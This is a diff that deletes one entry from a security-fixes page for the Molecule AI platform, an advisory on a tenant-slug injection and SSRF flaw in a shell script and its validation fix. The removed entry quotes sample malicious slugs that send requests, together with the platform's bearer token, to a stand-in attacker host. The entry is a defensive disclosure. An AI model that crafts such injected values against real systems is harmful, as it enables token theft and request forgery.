@@ -9,25 +9,6 @@ This page documents security fixes shipped in the Molecule AI platform. Each ent
 
 ---
 
-## Vulnerability
-
-`promote-tenant-image.sh` interpolated tenant slugs directly into URL paths and ECR repository identifiers without validation. A malicious slug such as `?url=https://attacker.com&token=$CP_TOKEN` could cause the platform to redirect HTTP calls to an attacker-controlled host (SSRF) and expose the platform's bearer token in the attacker's server access logs via the same URL parameter injection.
-
-Bash glob metacharacters (`*`, `?`, `[`) in slug values were subject to pathname expansion before being passed to curl, adding a secondary injection vector: a slug like `evil?url=https://attacker.com` would expand to a list of filenames before being interpolated into the URL.
-
-### Fix
-
-Two-layer defence applied to `promote-tenant-image.sh`:
-
-1. **`set -f`** (script top): disables glob expansion, so `*`, `?`, and `[` are treated as literal characters.
-2. **`validate_slug()`**: new function using RFC-1123 regex (`^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$`). Invalid slugs are rejected with exit code 64 before any network call is issued. Additionally, `validate_tenants()` is called after argument parsing and exits 64 on any tenant with an invalid slug.
-
-### User-facing summary
-
-Self-hosted operators must upgrade to the latest `molecule-core` build to include this fix. Tenant slugs are now validated against RFC-1123 before any network call. Slugs containing `?`, `#`, `&`, `$`, `/`, `\`, or spaces are rejected. If you cannot upgrade immediately, audit all tenant slugs and rename any containing these characters.
-
----
-
 ## 2026-05-14 — CWE-78: Regression in `expandWithEnv` POSIX-identifier Guard
 
 **Severity:** Critical (CWE-78)
